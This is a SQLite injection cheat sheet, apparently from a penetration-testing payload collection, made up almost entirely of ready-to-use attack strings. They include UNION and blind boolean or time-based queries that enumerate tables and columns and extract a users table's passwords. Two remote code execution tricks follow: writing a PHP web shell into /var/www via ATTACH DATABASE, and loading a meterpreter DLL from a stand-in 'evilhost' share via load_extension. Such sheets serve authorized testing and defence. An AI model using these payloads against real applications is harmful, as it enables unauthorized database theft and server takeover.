# SQLite Injection

## Summary

- [SQLite Injection](#sqlite-injection)
  - [Summary](#summary)
  - [SQLite comments](#sqlite-comments)
  - [SQLite version](#sqlite-version)
  - [Integer/String based - Extract table name](#integerstring-based---extract-table-name)
  - [Integer/String based - Extract column name](#integerstring-based---extract-column-name)
  - [Boolean - Count number of tables](#boolean---count-number-of-tables)
  - [Boolean - Enumerating table name](#boolean---enumerating-table-name)
  - [Boolean - Extract info](#boolean---extract-info)
  - [Extract Password of Current User](#extract-password-of-current-user)
  - [Time based](#time-based)
  - [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
  - [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)


## SQLite comments

```sql
--
/**/
```

## SQLite version

```sql
select sqlite_version();
```

```sql
username=")) UNION+SELECT 1,sqlite_version(),3,4--
```

## Integer/String based - Extract table name

```sql
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

```sql
username=")) UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

Use limit X+1 offset X, to extract all tables.

## Integer/String based - Extract column name

```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

```sql
username=")) UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='<table>'-- -
```

For a clean output

```sql
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

## Boolean - Count number of tables

```sql
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

## Boolean - Enumerating table name

```sql
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## Boolean - Extract info

```sql
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Extract Password of Current User

```sql
username="))+union+select+username,+password,+3,+4+from+users+limit+1+--
```

## Time based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

## Remote Command Execution using SQLite command - Attach Database

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
```

## Remote Command Execution using SQLite command - Load_extension

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

Note: By default this component is disabled
